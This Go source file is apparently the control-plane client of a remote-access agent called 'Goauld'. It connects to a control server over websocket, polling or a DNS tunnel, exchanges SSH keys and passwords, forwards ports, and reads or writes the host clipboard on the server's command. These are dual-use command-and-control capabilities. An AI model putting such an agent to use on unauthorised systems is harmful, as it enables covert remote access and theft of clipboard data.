package control

import (
	"Goauld/agent/clipboard"
	"Goauld/common"
	"Goauld/common/utils"
	"context"
	"errors"
	"fmt"
	"strings"
	"time"

	"github.com/xtaci/smux"
	"golang.org/x/crypto/bcrypt"

	"Goauld/agent/config"
	"Goauld/agent/proxy"
	"Goauld/common/crypto"
	"Goauld/common/log"
	"Goauld/common/ssh"

	socketio "Goauld/common/socket.io"

	sio "github.com/hazegard/socket.io-go"
	eio "github.com/hazegard/socket.io-go/engine.io"
	"github.com/coder/websocket"
	"github.com/quic-go/webtransport-go"
)

// ControlPlanClient Handle the socket.io interaction regarding the management of the agent.
//
//nolint:revive
type ControlPlanClient struct {
	manager      *sio.Manager
	socket       sio.ClientSocket
	configDone   chan<- struct{}
	ctx          context.Context
	url          string
	canceler     *utils.GlobalCanceler
	errorCounter int
}

// NewControlPlanClient returns a new ControlPlanClient.
func NewControlPlanClient(ctx context.Context, configDone chan<- struct{}, canceler *utils.GlobalCanceler) *ControlPlanClient {
	return &ControlPlanClient{
		ctx:        ctx,
		url:        config.Get().SocketIoURL(),
		configDone: configDone,
		canceler:   canceler,
	}
}

// InitStrategy is a struc holding the name of the transport as well
// as the function that will be used to initialize the socket.io connection.
type InitStrategy struct {
	Name     string
	InitFunc CpcStarter
}

// CpcStarter is a function that will be used to initialize the socket.io connection
// It returns an error if the connection failed.
type CpcStarter func(*ControlPlanClient, chan<- struct{}, chan<- error) error

// Init tries to connect to the control plan using the different strategies (CpcStarter)
// A successful connection will send a signal using the configDone channel.
func Init(ctx context.Context, globalCanceler *utils.GlobalCanceler, configDone chan<- struct{}, controlErr chan<- error, cpcStarter CpcStarter) (*ControlPlanClient, error) {
	ctx, cancel := context.WithCancel(ctx)
	controlPlanClient := NewControlPlanClient(ctx, configDone, globalCanceler)
	chanErr := make(chan error)
	chanSuccess := make(chan struct{})
	err := cpcStarter(controlPlanClient, chanSuccess, chanErr)
	if err != nil {
		cancel()

		return nil, err
	}
	// Start the control socket.io
	go func() {
		select {
		case controlErr <- controlPlanClient.Start():
		case <-ctx.Done():
		}
		cancel()
		controlPlanClient.Close()
	}()
	select {
	case e := <-chanErr:
		controlPlanClient.Close()
		cancel()

		return nil, e
	case <-chanSuccess:
		return controlPlanClient, nil
	}
}

// InitWs tries to connect to the control plan using the websocket transport.
func (cpc *ControlPlanClient) InitWs(success chan<- struct{}, chanErr chan<- error) error {
	cfg := getEioConfig([]string{"websocket"})

	return cpc.init(cfg, success, chanErr)
}

// InitWsUpgrade tries to connect to the control plan using the http to websocket upgrade transport.
func (cpc *ControlPlanClient) InitWsUpgrade(success chan<- struct{}, chanErr chan<- error) error {
	cfg := getEioConfig([]string{"polling", "websocket"})

	return cpc.init(cfg, success, chanErr)
}

// InitPolling tries to connect to the control plan using the HTTP long polling transport.
func (cpc *ControlPlanClient) InitPolling(success chan<- struct{}, chanErr chan<- error) error {
	cfg := getEioConfig([]string{"polling"})

	return cpc.init(cfg, success, chanErr)
}

// InitOverDNS tries to connect to the control plan using the DNS transport.
func (cpc *ControlPlanClient) InitOverDNS(session *smux.Stream, success chan<- struct{}, chanErr chan<- error) error {
	_, err := session.Write([]byte(config.Get().ID))
	// DNS MODE means we are using http to simplify the exchanges
	u := strings.TrimPrefix(strings.TrimPrefix(config.Get().SocketIoURL(), "https://"), "http://")
	cpc.url = "http://" + u
	if err != nil {
		return fmt.Errorf("error writing id to DNS tunnelled session: %w", err)
	}
	_, err = session.Write([]byte{'C'})
	if err != nil {
		return fmt.Errorf("error writing id to DNS tunnelled session: %w", err)
	}
	cfg := getDNSEioConfig(session)

	return cpc.init(cfg, success, chanErr)
}

// Init initializes the socket.io handlers.
func (cpc *ControlPlanClient) init(cfg *sio.ManagerConfig, success chan<- struct{}, chanErr chan<- error) error {
	manager := sio.NewManager(cpc.url, cfg)
	socket := manager.Socket("/", nil)

	socket.OnConnect(func() {
		log.Trace().Msg("OnConnect")
		log.Info().Msgf("Connected to the control server %s", cpc.url)
		success <- struct{}{}
	})
	socket.OnConnectError(func(err any) {
		log.Trace().Msg("OnConnectError")
		log.Error().Msgf("Error occurred connecting to %s (%v)", cpc.url, err)
		chanErr <- fmt.Errorf("error connecting to %s (%v)", cpc.url, err)
	})

	manager.OnError(func(err error) {
		log.Trace().Msg("OnError")
		log.Error().Err(err).Msgf("Error occurred  %s", cpc.url)
		cpc.ErrorPlusPlus()
	})
	manager.OnReconnect(func(attempt uint32) {
		cpc.canceler.Restart("Control socket disconnected")
		log.Trace().Msg("OnReconnect")
		log.Warn().Msgf("Reconnected to the control server %s, attempts N° %d", cpc.url, attempt)
	})

	// SendSSHPrivateKeyEvent is sent by the server after the client sends the RegisterEvent event
	// this event contains the encrypted SSH private key used by the agent to authenticate on the
	// SSHD server.
	// Once received, the agent sends its SSHD password to the server using the SendAgentDataEvent event
	socket.OnEvent(socketio.SendSSHPrivateKeyEvent.ID(), func(data []byte) {
		log.Trace().Msg("OnEvent: SendSSHPrivateKeyEvent")
		log.Trace().Msgf("SshPrivateKeyEvent: data received")
		// Decrypt the SSH private key
		privateKey, err := socketio.DecryptSSHPrivateKeyMessage(data, config.Get().Cryptor)
		if err != nil {
			log.Error().Err(err).Msgf("Error decrypting private key")
		}

		// Add the decrypted SSH private key to the agent configuration
		config.Get().SSHPrivateKey = privateKey.SSHPrivateKey
		log.Debug().Msgf("SSH private key received and successfully decrypted")
		log.Debug().Msgf("Sending local sshd password")
		// Encrypt the SSH password used by the client to authenticate to the agent SSHD server
		localSSHPassword, err := socketio.NewEncryptedAgentSSHPasswordMessage(config.Get(), config.Get().Cryptor)
		if err != nil {
			log.Error().Err(err).Msgf("Error encrypting local sshd password")
		}
		log.Debug().Msgf("Local sshd password sent")
		// Send the encrypted SSH password to the server
		socket.Emit(socketio.SendAgentDataEvent.ID(), localSSHPassword)

		log.Trace().Msg("OnEvent: SendSSHPrivateKeyEvent done")
	})

	// SendSSHHPrivateKeyError Logs when the server returns an error
	socket.OnEvent(socketio.SendSSHHPrivateKeyError.ID(), func() {
		log.Trace().Msg("OnEvent: SendSSHHPrivateKeyError")
		log.Error().Msgf("Error occurred (%s) %s", "SendSSHHPrivateKeyError", cpc.url)
		log.Trace().Msg("OnEvent: SendSSHHPrivateKeyError done")
	})

	// VersionEvent sends the current server version
	// To display a message to the user if the server and the agent version mismatch
	socket.OnEvent(socketio.VersionEvent.ID(), func(srvVersion common.JVersion) {
		agentVersion := common.JSONVersion()
		if agentVersion.Compare(srvVersion) != 0 {
			log.Warn().Err(errors.New("mismatch version")).Str("Server", srvVersion.Version).Str("Agent", agentVersion.Version).Msgf("Version mismatch")
			log.Trace().Str("ServerCommit", srvVersion.Commit).Str("AgentCommit", agentVersion.Commit).Msgf("Version mismatch")
			log.Trace().Str("ServerDate", srvVersion.Date).Str("AgentDate", agentVersion.Date).Msgf("Version mismatchs")
		}
	})

	// SendSSHPrivateKeySuccess Logs when the server returns no error
	socket.OnEvent(socketio.SendSSHPrivateKeySuccess.ID(), func() {
		log.Trace().Msg("OnEvent: SendSSHPrivateKeySuccess")
		log.Debug().Msgf("Event SendSSHPrivateKeySuccess received")
		log.Trace().Msg("OnEvent: SendSSHPrivateKeySuccess done")
	})

	// SendAgentDataError Logs when the server returns an error
	socket.OnEvent(socketio.SendAgentDataError.ID(), func() {
		log.Trace().Msg("OnEvent: SendAgentDataError")
		log.Error().Msgf("Error occurred (%s) %s", "SendAgentDataError", cpc.url)
		log.Trace().Msg("OnEvent: SendAgentDataError done")
	})

	// SendAgentDataSuccess Logs when the server returns no error
	// As it complete the configuration steps between the agent and the server
	socket.OnEvent(socketio.SendAgentDataSuccess.ID(), func() {
		log.Trace().Msg("OnEvent: SendAgentDataSuccess")
		cpc.configDone <- struct{}{}
		log.Trace().Msg("OnEvent: SendAgentDataSuccess done")
	})

	// RegisterError fire when an error occurs on the server side when the agent registers
	socket.OnEvent(socketio.RegisterError.ID(), func(data socketio.SioError) {
		if strings.Contains(data.Message, "UNIQUE constraint failed: agents.name") {
			log.Error().Err(errors.New("agent Name already used, either delete the corresponding agent in the TUI or rename this agent")).Msgf("RegisterError")
			cpc.canceler.Exit("Agent Name already used")
			cpc.Close()
		} else {
			log.Error().Err(errors.New(data.Message)).Msgf("Error occurred %s", "RegisterError")
			log.Info().Msgf("Restarting...")
			socket.Disconnect()

			cpc.canceler.Restart("Error occurs on the server while registering")
			cpc.Close()
		}
	})

	// ExitEvent is sent by the server when the agent is requested to exit
	socket.OnEvent(socketio.ExitEvent.ID(), func(doExit bool) {
		log.Info().Msg("OnEvent: Exit requested")
		socket.Emit(socketio.ExitSuccess.ID())
		socket.Disconnect()
		if doExit {
			cpc.canceler.Exit("Server requested exit")
		}
		cpc.canceler.Restart("Server requested restart")
		cpc.Close()
	})

	// AlreadyConnectedEvent is sent by the server when the agent is already running.
	// The agent should exit
	socket.OnEvent(socketio.AlreadyConnectedEvent.ID(), func() {
		log.Info().Msg("AlreadyConnectedEvent: Exit requested because agent is already running")
		socket.Emit(socketio.ExitSuccess.ID())
		socket.Disconnect()
		cpc.canceler.Exit("The agent is already connected")
	})

	socket.OnEvent(socketio.PasswordValidationRequestEvent.ID(), func(data []byte) {
		log.Trace().Msg("OnEvent: PasswordValidationRequestEvent")
		passwordValidationReq, err := socketio.DecryptPasswordValidationRequest(data, config.Get().Cryptor)
		if err != nil {
			log.Error().Err(err).Msg("OnEvent: DecryptPasswordValidationRequest")

			return
		}
		err = bcrypt.CompareHashAndPassword([]byte(passwordValidationReq.HashPassword), []byte(config.Get().PrivateSshdPassword()))
		if err != nil {
			log.Debug().Err(err).Msg("PasswordValidationRequestEvent: CompareHashAndPassword")
		}
		res := err == nil

		response, err := socketio.NewEncryptPasswordValidationResponse(res, config.Get().Cryptor)
		if err != nil {
			log.Error().Err(err).Msg("OnEvent: EncryptPasswordValidationRequest")
		}
		socket.Emit(passwordValidationReq.EventID, response)
		log.Trace().Bool("Response", res).Msgf("Emit: %s", passwordValidationReq.EventID)
	})

	socket.OnEvent(socketio.ClipboardContentEvent.ID(), func(data []byte) {
		log.Trace().Msg("OnEvent: ClipboardContentEvent")
		message, err := socketio.DecryptClipboardMessageEventMessage(data, config.Get().Cryptor)
		if err != nil {
			log.Error().Err(err).Msg("OnEvent: DecryptClipboardMessageEventMessage")

			return
		}
		err = bcrypt.CompareHashAndPassword([]byte(message.HashPassword), []byte(config.Get().PrivateSshdPassword()))
		if err != nil {
			log.Debug().Err(err).Msg("PasswordValidationRequestEvent: CompareHashAndPassword")

			return
		}

		err = clipboard.Paste(message.Content)
		if err != nil {
			log.Error().Err(err).Msg("OnEvent: Paste")
		}
	})

	socket.OnEvent(socketio.CopyClipboardRequestEvent.ID(), func(data []byte) {
		log.Trace().Msg("OnEvent: CopyClipboardRequestEvent")
		req, err := socketio.DecryptClipboardRequestMessageEventMessage(data, config.Get().Cryptor)
		if err != nil {
			log.Error().Err(err).Msg("OnEvent: DecryptClipboardMessageEventMessage")

			return
		}

		err = bcrypt.CompareHashAndPassword([]byte(req.HashPassword), []byte(config.Get().PrivateSshdPassword()))
		if err != nil {
			log.Debug().Err(err).Msg("PasswordValidationRequestEvent: CompareHashAndPassword")

			return
		}

		content, err := clipboard.Copy()
		if err != nil {
			log.Error().Err(err).Msg("OnEvent: Copy")
		}

		res := err == nil

		resp := socketio.ClipboardMessage{
			Error:   res,
			Content: content,
		}

		response, err := socketio.NewEncryptedClipboardMessageEventMessage(resp, config.Get().Cryptor)
		if err != nil {
			log.Error().Err(err).Msg("OnEvent: EncryptPasswordValidationRequest")
		}
		socket.Emit(req.EventID, response)
		log.Trace().Bool("Response", res).Msgf("Emit: %s", req.EventID)
	})

	cpc.socket = socket
	cpc.manager = manager

	return nil
}

// Start starts the socket and initiates the configuration exchange with the server.
func (cpc *ControlPlanClient) Start() error {
	encryptedKey, err := crypto.AsymEncrypt(config.Get().AgePubKey(), config.Get().SharedSecret)
	if err != nil {
		return fmt.Errorf("error encrypting shared secret: %w", err)
	}

	encryptedName, err := crypto.AsymEncrypt(config.Get().AgePubKey(), config.Get().Name())
	if err != nil {
		return fmt.Errorf("error encrypting shared secret: %w", err)
	}

	// This will be emitted after the socket is connected.
	cpc.socket.Emit(socketio.RegisterEvent.ID(), socketio.Register{
		ID:        config.Get().ID,
		SharedKey: encryptedKey,
		Name:      encryptedName,
	})

	cpc.socket.Connect()
	// starts the keepalive in the background
	go cpc.keepAliveLoop(cpc.ctx)
	log.Debug().Msgf("Connected to the control server %s", cpc.url)
	log.Trace().Msg("Event send: RegisterEvent")
	// Waits for an error or the end of the socket
	<-cpc.ctx.Done()
	log.Warn().Msgf("Shutting done the socketio control socket")
	cpc.socket.Emit(socketio.Disconnect.ID(), socketio.DisconnectMessage{})
	log.Trace().Msg("Event send: Disconnect")
	cpc.socket.Disconnect()

	return nil
}

// SendPorts sends the remote ports used by the agent.
func (cpc *ControlPlanClient) SendPorts(rpf []ssh.RemotePortForwarding) error {
	data, err := socketio.EncryptRemotePortForwardingMessage(rpf, config.Get().Cryptor)
	if err != nil {
		return fmt.Errorf("error encrypting remote port forwarding message: %w", err)
	}

	success := make(chan struct{}, 1)
	// SendRemotePortForwardingDataError is sent by the server when the forwarding ports
	// are successfully received by the server
	cpc.socket.OnEvent(socketio.SendRemotePortForwardingDataSuccess.ID(), func() {
		log.Info().Msgf("SendRemotePortForwardingDataSuccess successfully sent")
		success <- struct{}{}
	})
	defer cpc.socket.OffEvent(socketio.SendRemotePortForwardingDataSuccess.ID())
	cpc.socket.Emit(socketio.SendRemotePortForwardingDataEvent.ID(), data)
	<-success

	return nil
}

// KeepAliveLoop starts a keepalive loop that will periodically send ping
//
// to keep alive the connection.
func (cpc *ControlPlanClient) keepAliveLoop(ctx context.Context) {
	cpc.socket.OnEvent(socketio.PongEvent.ID(), func(_ []byte) {
		log.Trace().Msg("OnEvent: PongEvent")
	})
	if config.Get().GetKeepalive() == 0 {
		return
	}
	//nolint:durationcheck
	t := time.NewTicker(config.Get().GetKeepalive() * time.Second)
	defer t.Stop()
	for {
		select {
		case <-t.C:
			log.Trace().Msg("OnEvent: PingEvent")
			cpc.socket.Emit(socketio.PingEvent.ID())
		case <-ctx.Done():
			return
		}
	}
}

// ErrorPlusPlus handle when an error occurs on the socket.io side
// If more than 5 errors occur, the agent will automatically restart
// See to check the errors in a given time, reset the counter after some time.
func (cpc *ControlPlanClient) ErrorPlusPlus() {
	cpc.errorCounter++
	if cpc.errorCounter > 5 {
		log.Warn().Msgf("Error occurred %d times, restarting...", cpc.errorCounter)
		cpc.canceler.Restart(fmt.Sprintf("Control sockets crashed %d times", cpc.errorCounter))
		cpc.Close()
	}
}

// Close closes the socket.io connection.
func (cpc *ControlPlanClient) Close() {
	cpc.socket.Disconnect()
	cpc.socket.Emit(socketio.Disconnect.ID(), socketio.DisconnectMessage{})
	cpc.manager.Close()
}

// getEioConfig return the socket.io underlying configuration.
func getEioConfig(transport []string) *sio.ManagerConfig {
	return &sio.ManagerConfig{
		EIO: eio.ClientConfig{
			UpgradeDone: func(transportName string) {
				log.Trace().Str("Transport", transportName).Msg("Client transport upgrade done")
			},
			HTTPTransport: proxy.NewTransportProxy(),
			WebSocketDialOptions: &websocket.DialOptions{
				HTTPClient: proxy.NewHTTPClientProxy(nil),
				HTTPHeader: proxy.NewHeaderMap(),
			},
			WebTransportDialer: &webtransport.Dialer{
				TLSClientConfig: proxy.NewTLSConfig(),
			},
			Transports: transport, // []string{"polling"}, //, "websocket", "webtransport"},
			// Debugger:   sio.NewPrintDebugger(),
		},
	}
}

// getEioConfig return the socket.io underlying configuration.
func getDNSEioConfig(session *smux.Stream) *sio.ManagerConfig {
	return &sio.ManagerConfig{
		EIO: eio.ClientConfig{
			UpgradeDone: func(transportName string) {
				log.Trace().Str("Transport", transportName).Msg("Client transport upgrade done")
			},
			HTTPTransport: NewSmuxTransport(session),
			WebSocketDialOptions: &websocket.DialOptions{
				HTTPClient: newSmuxHTTPandHTTPSClient(session),
			},
			// When tunneling over DNS, if we use polling only or polling then websocket upgrade,
			// The tunnel fails to establish properly as the server responds to unwanted content to the open HTTP socket.
			// Here we use the full duplex websocket mechanism to ensure that the tunnel is properly working
			// On the client side
			Transports: []string{"websocket"}, // , "websocket"},
			// Debugger:   sio.NewPrintDebugger(),
		},
	}
}
